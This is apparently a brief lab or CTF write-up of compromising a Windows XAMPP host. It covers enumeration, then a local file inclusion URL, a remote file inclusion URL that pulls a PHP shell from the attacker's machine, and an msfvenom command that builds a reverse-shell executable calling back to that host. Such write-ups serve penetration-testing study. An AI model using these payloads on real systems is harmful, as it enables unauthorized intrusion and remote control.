#Pwned! 
```IP

```
# Enumeration
## FTP 21
FileZilla ftpd 0.9.41 beta
https://github.com/NeoTheCapt/FilezillaExploit/tree/master
## SMB
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210105939.png?raw=true)

## HTTP 8080
XAMPP
phpmyadmin Access to the requested directory is only available from the local network.
phpinfo.php
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210105723.png?raw=true)
user rupert
big.txt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210110447.png?raw=true)
/site
LFI in page parameter
```
http://192.168.164.53:4443/site/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210110647.png?raw=true)


## MYSQL 3306
Host '192.168.45.189' is not allowed to connect to this MariaDB server
## HTTP 4443
Apache httpd 2.4.43

# Exploitation
I tried RFI
```
http://192.168.164.53:4443/site/index.php?page=http://192.168.45.189/shell-ivan.php
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210184137.png?raw=true)
# PrivEsc

## Manual

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe > reverse.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191250.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191226.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191359.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

